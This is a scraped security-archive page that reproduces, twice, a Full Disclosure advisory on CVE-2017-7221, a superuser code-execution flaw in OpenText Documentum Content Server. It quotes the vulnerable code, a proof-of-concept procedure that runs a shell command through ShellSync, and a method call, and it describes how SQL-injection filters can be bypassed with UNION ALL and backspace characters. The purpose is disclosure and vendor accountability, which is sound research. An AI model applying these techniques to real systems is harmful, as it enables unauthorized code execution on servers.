# Fulldisclosure -- Improving network security through full disclosure

## About Fulldisclosure

The Full Disclosure mailing list is a public forum for detailed discussion of vulnerabilities and exploitation techniques, as well as tools, papers, news, and events of interest to the community. FD differs from other security lists in its open nature and support for researchers' right to decide how to disclose their own discovered bugs. The [full disclosure movement](https://en.wikipedia.org/wiki/Full_disclosure_%28computer_security%29) has been credited with forcing vendors to better secure their products and to publicly acknowledge and fix flaws rather than hide them. Vendor legal intimidation and censorship attempts are not tolerated here!

This list is meant as a spiritual successor to the [grok.org.uk Full-Disclosure list](http://lists.grok.org.uk/full-disclosure-charter.html) started by Len Rose and John Cartwright in 2002 and [terminated abruptly in March 2014](http://seclists.org/fulldisclosure/2014/Mar/332) due to bogus legal threats. We are giving this list a fresh start, so members of the old list need to resubscribe here.

This list is run by and for the network security community. Moderation is performed by a team of volunteers using our [moderation guidelines](https://secwiki.org/w/FD_Moderation). Time is truly of the essence in vulnerability disclosure, so we try to keep the moderation delay short. When we need more moderators we will recruit from the most active and insightful list members.

You must join the list before you can post to it. Submit posts to fulldisclosure@seclists.org. If you don't want list message delivery to the address you post from, you can disable it in [list config](https://nmap.org/mailman/options/fulldisclosure).

Posts are publicly archived at the [Seclists.org Full Disclosure web archive](http://seclists.org/fulldisclosure) and the list RSS feed is available there too. Various unofficial archives exist as well. You can prevent archiving (at least for Seclists) by specifying the [X-No-Archive mail header](http://en.wikipedia.org/wiki/X-No-Archive) in your post, but you might reconsider whether to post such a sensitive message to a public list in the first place.

Given the light moderation policy and that we generally don't verify posted information, and that email forgery is easy, deal with all list content at your own risk! In particular, running any "exploit scripts" or executables posted to this list can be disastrous.

'''
CVE Identifier: CVE-2017-7221
Vendor: OpenText
Affected products: OpenText Documentum Content Server (all versions)
Researcher: Andrey B. Panfilov
Severity Rating: CVSS v3 Base Score: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Fix: not available
PoC: https://gist.github.com/andreybpanfilov/0a4fdfad561e59317a720e702b0fec44

Description:

all versions of Documentum Content Server contain dm_bp_transition docbase
method ("stored procedure”) which is written on basic, implementation of this docbase
methods does not properly validate user input which allows attacker to execute arbitrary
code with superuser privileges.

Related code snippet is:

==========================================8<========================================

'Evaluate the user-defined entry criteria
If (result = True And run_entry = "T") Then
If (debug = True) Then
PrintToLog sess, "Run user defined entry criteria."
End If
'
' researcher comment:
' userEntryID parameter is controlled by attacker
'
result = RunProcedure(userEntryID, 1, sess, sysID,_
user_name, targetState)
End If

...

'
' researcher comment:
' procID parameter is controlled by attacker
'

Function RunProcedure(procID As String, procNo As Integer,_
sessID As String, objID As String, userName As String,_
targetState As String) As Boolean

...

StartIt:
If (procID <> "0000000000000000") Then
result = CheckStatus("", 1, "loading procedure " & procID, True, errorMsg)
'
' researcher comment:
' here basic interpreter loads content of user-provided script
' from underlying repostiory using following technique:
'
' checking that it is dealing with dm_procedure object
' (check was introduced in CVE-2014-2513):
' id,c,dm_procedure where r_object_id='procID'
'
' getting content of basic script
' fetch,c,procID
' getpath,c,l
'

result = external(procID)
If (result = True) Then
If (procNo = 1) Then
' --- Running user-defined entry criteria ---
result = CheckStatus("", 1, "Running EntryCriteria", True, errorMsg)
On Error Goto NoFunction
'
' researcher comment
' here dmbasic interpreter executes user defined function
'
result = EntryCriteria(sessID, objID, userName,_
targetState, errorStack)
If (result = False) Then
errorStack = "[ErrorCode] 1500 [ServerError] " + _
errorStack
End If

==========================================>8========================================

So, attacker is able to create it’s own basic procedure in repository and pass it’s identifier
as argument for dm_bp_transition procedure:

==========================================8<========================================

Vendor was been notified about this vulnerability on November 2013 using customer
support channel, after a while vendor started claiming that this vulnerability
was remediated, though no CVE was announced. Moreover, the fix was contested
and CERT/CC started tracking this vulnerability, the PoC provided
to CERT/CC was:

==========================================8<========================================
Vendor have decided that the root cause of problem is users are able to
create dm_procedure objects, and now in Documentum Content Server

On July 2014 vendor announced ESA-2014-064 which was claiming that vulnerability has been remediated.

On November 2014 fix was contested (there was significant delay after ESA-2014-064 because vendor
constantly fails to provide status of reported vulnerabilities) by providing another proof of concept,
description provided to CERT/CC was:

==========================================8<========================================
I have tried to reproduce PoC, described in VRF#HUFPRMOP, and got following
error:

[ErrorCode] 1000 [Parameter] 0801fd08805c9dfe [ServerError] Unexpected
error: [DM_API_W_NO_MATCH]warning: "There was no match in the
docbase for the qualification: dm_procedure where r_object_id =
'0801fd08805c9dfe'"

Such behaviour means that EMC tried to remediate a security issue by
"checking" object type of supplied object:

Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle
Session id is s0
API> id,c,dm_procedure where r_object_id = '0801fd08805c9dfe'

bin]$ strings dmbasic| grep dm_procedure
id,%s,dm_procedure where object_name = '%s' and folder('%s')
id,%s,dm_procedure where r_object_id = '%s'
# old version of dmbasic binary
bin]$ strings dmbasic| grep dm_procedure
bin]$

So, the fix was implemented in dmbasic binary, the problem is neither 6.7
SP2 P15 nor 6.7 SP1 P28 patches contain dmbasic binary - the first patch
that was shipped with dmbasic binary was 6.7SP2 P17. Moreover, the
issue is still reproducible because introduced check could be bypassed
using SQL injection:

On August 2015 vendor had undertaken another attempt to remediate this vulnerability
check ESA-2015-131/CVE-2015-4533 for details.

On August 2015 the fix was contested, check http://seclists.org/bugtraq/2015/Aug/110
for detailed description - I just demonstrated another attack vector - using
UNION ALL keyword instead of UNION:

=================================8<================================

[DM_METHOD_E_METHOD_ARGS_INVALID]error:

=================================>8================================

Recently I have noticed that latest versions of Documentum Content
Server are not affected by the PoC provided above, however all versions
of Documentum Content Server are still vulnerable because vendor incorrectly
implemented input validation: they convert arguments to lower/upper-case,
replace line feed, carriage return and tab characters by a space,
remove double spaces, after that they check where resulting string contains
special keywords ('union ' and 'union all') or not - it is possible
to use other whitespace characters like backspace, which is demonstrated
in the PoC.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# CVE-2017-7221. OpenText Documentum Content Server: arbitrary code execution in dm\_bp\_transition.ebs docbase method

---

*From*: "Andrey B. Panfilov" <andrew () panfilov tel>

*Date*: Tue, 25 Apr 2017 03:38:28 +1000

```
CVE Identifier: CVE-2017-7221
Vendor: OpenText
Affected products: OpenText Documentum Content Server (all versions)
Researcher: Andrey B. Panfilov
Severity Rating: CVSS v3 Base Score: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Fix: not available
PoC: <https://gist.github.com/andreybpanfilov/0a4fdfad561e59317a720e702b0fec44>

Description:

all versions of Documentum Content Server contain dm_bp_transition docbase
method ("stored procedure”) which is written on basic, implementation of this docbase
methods does not properly validate user input which allows attacker to execute arbitrary
code with superuser privileges.

Related code snippet is:

==========================================8<========================================

'Evaluate the user-defined entry criteria
If (result = True And run_entry = "T") Then
If (debug = True) Then
PrintToLog sess, "Run user defined entry criteria."
End If
'
' researcher comment:
' userEntryID parameter is controlled by attacker
'
result = RunProcedure(userEntryID, 1, sess, sysID,_
user_name, targetState)
End If

...

'
' researcher comment:
' procID parameter is controlled by attacker
'

Function RunProcedure(procID As String, procNo As Integer,_
sessID As String, objID As String, userName As String,_
targetState As String) As Boolean

...

StartIt:
If (procID <> "0000000000000000") Then
result = CheckStatus("", 1, "loading procedure " & procID, True, errorMsg)
'
' researcher comment:
' here basic interpreter loads content of user-provided script
' from underlying repostiory using following technique:
'
' checking that it is dealing with dm_procedure object
' (check was introduced in CVE-2014-2513):
' id,c,dm_procedure where r_object_id='procID'
'
' getting content of basic script
' fetch,c,procID
' getpath,c,l
'

result = external(procID)
If (result = True) Then
If (procNo = 1) Then
' --- Running user-defined entry criteria ---
result = CheckStatus("", 1, "Running EntryCriteria", True, errorMsg)
On Error Goto NoFunction
'
' researcher comment
' here dmbasic interpreter executes user defined function
'
result = EntryCriteria(sessID, objID, userName,_
targetState, errorStack)
If (result = False) Then
errorStack = "[ErrorCode] 1500 [ServerError] " + _
errorStack
End If

==========================================>8========================================

So, attacker is able to create it’s own basic procedure in repository and pass it’s identifier
as argument for dm_bp_transition procedure:

==========================================8<========================================
$ cat /tmp/test
cat: /tmp/test: No such file or directory
$ cat > test.ebs
Public Function EntryCriteria(ByVal SessionId As String,_
ByVal ObjectId As String,_
ByVal UserName As String,_
ByVal TargetState As String,_
ByRef ErrorString As String) As Boolean
t = ShellSync("echo dm_bp_transition_has_vulnerability > /tmp/test")
EntryCriteria=True
End Function

==========================================>8========================================

Vendor was been notified about this vulnerability on November 2013 using customer
support channel, after a while vendor started claiming that this vulnerability
was remediated, though no CVE was announced. Moreover, the fix was contested
and CERT/CC started tracking this vulnerability, the PoC provided
to CERT/CC was:

==========================================8<========================================
Vendor have decided that the root cause of problem is users are able to
create dm_procedure objects, and now in Documentum Content Server
v6.7SP1P26 we have following behavior:

On July 2014 vendor announced ESA-2014-064 which was claiming that vulnerability has been remediated.

On November 2014 fix was contested (there was significant delay after ESA-2014-064 because vendor
constantly fails to provide status of reported vulnerabilities) by providing another proof of concept,
description provided to CERT/CC was:

==========================================8<========================================
I have tried to reproduce PoC, described in VRF#HUFPRMOP, and got following
error:

[ErrorCode] 1000 [Parameter] 0801fd08805c9dfe [ServerError] Unexpected
error: [DM_API_W_NO_MATCH]warning: "There was no match in the
docbase for the qualification: dm_procedure where r_object_id =
'0801fd08805c9dfe'"

Such behaviour means that EMC tried to remediate a security issue by
"checking" object type of supplied object:

Connected to Documentum Server running Release 6.7.2190.0198 Linux.Oracle

API> id,c,dm_procedure where r_object_id = '0801fd08805c9dfe'

bin]$ strings dmbasic| grep dm_procedure
id,%s,dm_procedure where object_name = '%s' and folder('%s')
id,%s,dm_procedure where r_object_id = '%s'
# old version of dmbasic binary
bin]$ strings dmbasic| grep dm_procedure
bin]$

So, the fix was implemented in dmbasic binary, the problem is neither 6.7
SP2 P15 nor 6.7 SP1 P28 patches contain dmbasic binary - the first patch
that was shipped with dmbasic binary was 6.7SP2 P17. Moreover, the
issue is still reproducible because introduced check could be bypassed
using SQL injection:

On August 2015 vendor had undertaken another attempt to remediate this vulnerability
check ESA-2015-131/CVE-2015-4533 for details.

On August 2015 the fix was contested, check <http://seclists.org/bugtraq/2015/Aug/110>
for detailed description - I just demonstrated another attack vector - using
UNION ALL keyword instead of UNION:

=================================8<================================
API> ?,c,execute do_method WITH METHOD='dm_bp_transition', ARGUMENTS='
repo repo dmadmin "" 0000000000000000 0000000000000000

0 0 T F T T dmadmin 0000000000000000'

[DM_METHOD_E_METHOD_ARGS_INVALID]error:
"The arguments being passed to the method 'dm_bp_transition' are
invalid:

New attack vector (note ALL keyword):

repo repo dmadmin "" 0000000000000000 0000000000000000

=================================>8================================

Recently I have noticed that latest versions of Documentum Content
Server are not affected by the PoC provided above, however all versions
of Documentum Content Server are still vulnerable because vendor incorrectly
implemented input validation: they convert arguments to lower/upper-case,
replace line feed, carriage return and tab characters by a space,
remove double spaces, after that they check where resulting string contains
special keywords ('union ' and 'union all') or not - it is possible
to use other whitespace characters like backspace, which is demonstrated
in the PoC.
